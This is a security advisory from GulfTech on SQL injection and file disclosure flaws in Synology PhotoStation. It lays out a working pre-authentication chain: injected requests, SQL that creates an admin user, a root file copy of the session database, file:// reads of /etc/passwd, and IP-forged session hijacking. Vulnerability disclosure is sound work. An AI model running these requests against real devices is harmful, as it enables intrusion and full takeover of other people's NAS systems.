@@ -1,0 +1,375 @@
+Synology Photostation Multiple Vulnerabilities
+
+Vendor: Synology
+Product: Synology Photostation
+Version: <= 6.7.2-3429
+Website: http://www.synology.com
+
+
+###########################################################################
+                     ______      ____________          __  
+                    / ____/_  __/ / __/_  __/__  _____/ /_ 
+                   / / __/ / / / / /_  / / / _ \/ ___/ __ \
+                  / /_/ / /_/ / / __/ / / /  __/ /__/ / / /         
+                  \____/\__,_/_/_/   /_/  \___/\___/_/ /_/ 
+                                                                
+                     GulfTech Research and Development                                                                 
+
+###########################################################################
+#      Synology PhotoStation <= 6.7.2-3429 Multiple Vulnerabilities       #
+###########################################################################
+ 
+
+Released Date: 2018-01-08
+Last Modified: 2017-07-22
+ Company Info: Synology
+ Version Info: 
+              Vulnerable
+               Synology PhotoStation <= 6.7.2-3429
+
+
+--[ Table of contents
+
+00 - Introduction
+    00.1 Background
+
+01 - SQL Injection
+    01.1 - Vulnerable code analysis
+    01.2 - Remote exploitation
+
+02 - File Disclosure
+    02.1 - Vulnerable code analysis
+    02.2 - Remote exploitation
+
+03 - Credit
+
+04 - Proof of concept
+
+05 - Solution
+
+06 - Contact information
+
+
+--[ 00 - Introduction
+
+The purpose of this article is to detail the research that I have completed 
+regarding Synology PhotoStation. The issues I have discovered can be used
+in conjuction with one another to gain remote preauth root access to the
+affected Synology NAS device.
+
+--[ 00.1 - Background
+
+The Synology Diskstation NAS by default installs several DSM applications
+unless specified otherwise during setup. One of these default applications
+installed is PhotoStation. PhotoStation is a web based photo manager.
+
+
+--[ 01 - SQL Injection
+
+There are a number of SQL Injection issues within the PhotoStation 
+application. Since PhotoStation uses a PostgreSQL database exploitation is
+trivial since multiple statements can easily be injected.
+
+--[ 01.1 - Vulnerable code analysis
+
+Below is vulnerable code from /photo/include/blog/label.php which takes GPC
+data and uses it directly in an SQL query
+
+---------------------------------------------------------------------------
+
+if($_POST['action'] == 'get_all_labels') {
+    echo SYNOBLOG_LABEL_GetLabelComboData($_POST['id']);
+} else if($_POST['action'] == "get_article_label" && 
+isset($_POST['article_id'])) {
+    echo SYNOBLOG_LABEL_GetArticleRawLabel($_POST['article_id']);
+} else if($_POST['action'] == "get_invalid_labels") {
+    echo SYNOBLOG_LABEL_GetInvalidLabels();
+}
+---------------------------------------------------------------------------
+
+Now let's have a look at any one of these functions.
+
+---------------------------------------------------------------------------
+
+function SYNOBLOG_LABEL_GetArticleRawLabel($article_id)
+{
+  global $blog_str_article_label_none;
+
+    $query = "Select label_name from blog_article_label where article_id = 
+    ".$article_id." order by label_name;";
+    $db_result = PHOTO_DB_Query($query);
+
+    while(($row = PHOTO_DB_FetchRow($db_result))) {
+        if($row[0] == "no_label") {
+            continue;
+        }
+        $result[] = $row[0];
+    }
+
+  return json_encode($result);
+}
+
+---------------------------------------------------------------------------
+
+As you can see from the above code the SQL injection is fairly straight
+forward as $article_id comes directly from the $_POST['article_id']
+variable. In addition to this SQL Injection is also an SQL Injection within
+the /photo/include/synotheme.php file within the SYNOTHEME_GET_BKG_PIC()
+function due to the "type" parameter never being sanitized.
+
+---------------------------------------------------------------------------
+
+function SYNOTHEME_GET_BKG_PIC($mode, $type)
+{
+  $show_bkg_img_key = 'photo' === $type ? 'v6_show_bkg_img' : 
+  'show_bkg_img';
+  if (null == $show_bkg_img =  csSYNOPhotoMisc::GetConfigDB($mode, 
+  $show_bkg_img_key, $type . '_config')) {
+    csSYNOPhotoMisc::UpdateConfigDB('theme', $show_bkg_img_key, '3', 
+    $type . '_config');
+    $show_bkg_img = '3';
+  }
+
+---------------------------------------------------------------------------
+
+In the above code the "type" variable is used to specify the table name
+within an SQL query. Unfortunately this "type" parameter is taken directly 
+from GPC data and never sanitized. No authentication is needed to exploit
+either of the previously mentioned SQL Injection vulnerabilities.
+
+--[ 01.2 - Remote exploitation
+
+Exploiting this issue is trivial, and can be achieved by simply sending a 
+post request containing a SQL Injection string within the "article_id"
+parameter.
+
+---------------------------------------------------------------------------
+
+POST /photo/include/blog/label.php HTTP/1.1
+Host: diskstation
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0)
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://diskstation/blog/
+Content-Length: 60
+Connection: close
+
+action=get_article_label&article_id=1; SELECT version(); -- 
+
+---------------------------------------------------------------------------
+
+The above request would successfully return the version of the PostgreSQL 
+database to the attacker. However, it is also possible to gain a remote 
+root shell with a decent bit of work by using the following steps.
+
+##[ STEP 00: 
+First we have to leverage the SQL Injection to enable the PhotoStation 
+authentication system. By default the PhotoStation application uses DSM to 
+authenticate. We need to change this so that it uses PhotoStation to 
+authenticate. This can be accomplished with the following query.
+
+---------------------------------------------------------------------------
+
+UPDATE photo_config SET config_value=0 WHERE config_key='account_system';
+
+---------------------------------------------------------------------------
+
+Now the PhotoStation authentication system should be successfully enabled 
+and ready for use. 
+
+##[ STEP 01: 
+
+Once the PhotoStation authentication system is successfully enabled we can 
+create an admin user and authenticate as this user to escalate our current
+privileges from PhotoStation admin to root.
+
+---------------------------------------------------------------------------
+
+INSERT INTO photo_user (userid, username, password, admin) VALUES (42, 
+'test', '098f6bcd4621d373cade4e832627b4f6', TRUE);
+
+---------------------------------------------------------------------------
+
+We now can login as the admin user "test" with the password "test".
+
+##[ STEP 02:
+
+The next step is to create a "video" record with a malicious "path" value 
+via SQL Injection. This "path" value holds the location of the file we want 
+to disclose as the root user. The PhotoStation admin panel is fairly secure 
+and does not give us many options for exploiting file handling issues. 
+However, the PhotoStation application trusts the "path" data taken 
+from the database when copying files, and does not validate it. We can 
+leverage this lack of sanity checks to copy any files we want as root to 
+the default photo directory. 
+
+---------------------------------------------------------------------------
+
+INSERT INTO video (id, path, title, container_type) VALUES (42, 
+'/usr/syno/etc/private/session/current.users', 'test', 'test');
+
+---------------------------------------------------------------------------
+
+The above record inserted would allow an attacker to copy the sessions db 
+to the default photo directory once a file copy operation is triggered by 
+the album_util.php script. This is because the copy and move operations use
+the "path" data taken from the database as the source argument. This file
+will be copied with root permissions by the "synphotoio" binary.
+
+##[ STEP 03:
+
+The next step for us is to trigger a file copy operation via album_util.php 
+where our malicious "path" value will be used by the "synphotoio" binary to 
+make a copy of the file as root in the default photo directory.
+
+---------------------------------------------------------------------------
+
+POST /photo/include/photo/album_util.php HTTP/1.1
+Host: diskstation
+User-Agent: Mozilla/5.0 
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+X-SYNO-TOKEN: ambru48o5nm3kpcla82j1b98s4
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://diskstation/photo/
+Content-Length: 45
+Cookie: stay_login=1; PHPSESSID=c4kclpg4j3bndcpuq4pvs9of10;
+Connection: close
+
+action=copy_items&video_list=42&destination=2f
+
+---------------------------------------------------------------------------
+
+The above request will successfully copy the user sessions database to the
+default photo directory. We just have to make sure the "video_list" ID
+corresponds to the ID that we previously inserted into the database so that
+the "path" data we specified will be used in the file copy operation.
+
+##[ STEP 04:
+
+For the next step we have to be slick and use a file handling bug in the 
+file_upload.php script to copy the file disclosed by root to the web 
+directory for viewing. The only reason we are able to accomplish this is 
+because we're allowed to specify the full URL sent to a file_get_contents() 
+call. We could also use this bug to read any file that the web server has 
+access to. But, for now we will just copy the file we recently disclosed as 
+root since these particular file handling operations take place as an 
+unprivileged user and would limit the attacker impact greatly.
+
+---------------------------------------------------------------------------
+
+POST /photo/include/file_upload.php?dir=2f2e2e2f4061707073746f72652f50686f7
+46f53746174696f6e2f70686f746f2f&name=1/&fname=pwn&sid=ambru48o5nm3 HTTP/1.1
+Host: diskstation
+User-Agent: Mozilla/5.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Cookie: PHPSESSID=ambru48o5nm3; photo_remember_me=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+action=aviary_add&url=file:///volume1/photo/current.users
+
+---------------------------------------------------------------------------
+
+As you can see from the above request we are allow to specify a file:// URL
+and as a result copy the disclosed sessions db to the web directory as a 
+file named pwn.jpg and view all admin sessions. If it was not for this file
+handling bug in file_upload.php an attacker would have to access the file 
+via SMB or some other method thus making the attack much more complicated.
+
+##[ STEP 05:
+
+Once we have the sessions database we now have the session ID and IP
+addresses of administrators. We can use this information to now login to
+the DSM as an admin. It is possible to use headers such as "Client-IP" to 
+successfully forge the IP address of the stolen session data. So, the fact 
+that sessions are restricted by IP address does not really matter at all in
+this particular case.
+
+At this point it is game over as DSM admin users are able to run commands
+as root and have complete and total access to the entire system.
+
+
+--[ 02 - File Disclosure
+
+PhotoStation is vulnerable to a file disclosure issue. This issue is due to
+an unsafe file_get_contents() call within the SYNOPHOTO_AVIARY_Add() 
+function that allows an attacker to specify the full URL used.
+
+--[ 01.1 - Vulnerable code analysis
+
+Below is vulnerable code from /photo/include/file_upload.php which makes 
+use of a user supplied URL to populate the contents of $image_data.
+
+---------------------------------------------------------------------------
+
+$image_data = file_get_contents($_REQUEST['url']);
+
+---------------------------------------------------------------------------
+
+The above code allows authenticated users to easily disclose file contents
+with the privilege of the web server, or to possibly conduct SSRF attacks 
+against the internal network.
+
+--[ 01.2 - Remote exploitation
+
+Exploiting the issue requires user authentication, but other than that it
+is fairly trivial to take advantage of. Also, it should be noted that the
+required authentication can be acquired by using the previously mentioned
+SQL Injection issues in order to create arbitrary user accounts.
+
+---------------------------------------------------------------------------
+
+POST /photo/include/file_upload.php?dir=2f2e2e2f4061707073746f72652f50686f7
+46f53746174696f6e2f70686f746f2f&name=1/&fname=pwn&sid=ambru48o5nm3 HTTP/1.1
+Host: diskstation
+User-Agent: Mozilla/5.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Cookie: PHPSESSID=ambru48o5nm3; photo_remember_me=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+action=aviary_add&url=file:///etc/passwd
+
+---------------------------------------------------------------------------
+
+The above request would successfully copy the contents of the passwd file
+to http://diskstation/photo/pwn.jpg where it's contents could be viewed by 
+the attacker.
+
+
+--[ 03 - Credit
+
+James Bercegay
+GulfTech Research and Development
+
+
+--[ 04 - Proof of concept
+
+We strive to do our part to contribute to the security community.
+Metasploit modules for issues outlined in this paper can be found online.
+
+
+--[ 05 - Solution
+
+These issues were addressed in update 6.7.3-3432
+
+--[ 06 - Contact information
+
+Web
+https://gulftech.org/
+
+Mail
+security@gulftech.org
+
+
+Copyright 2018 GulfTech Research and Development. All rights reserved.
